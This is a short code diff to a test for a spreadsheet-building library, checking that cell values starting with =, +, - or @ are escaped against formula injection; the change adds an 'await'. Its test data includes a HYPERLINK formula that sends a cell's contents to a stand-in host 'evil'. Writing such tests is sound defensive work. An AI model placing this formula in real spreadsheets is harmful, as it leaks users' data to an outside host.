@@ -3,7 +3,7 @@ import { buildWorkbook, parseWorkbook } from '@/lib/excel';
 
 describe('lib/excel — formula injection escape (QA-021)', () => {
   it('escapes leading = + - @ in cell values when building a workbook', async () => {
-    const wb = buildWorkbook(
+    const wb = await buildWorkbook(
       [
         { name: '=HYPERLINK("http://evil/?x="&A1)' },
         { name: '+1+2' },
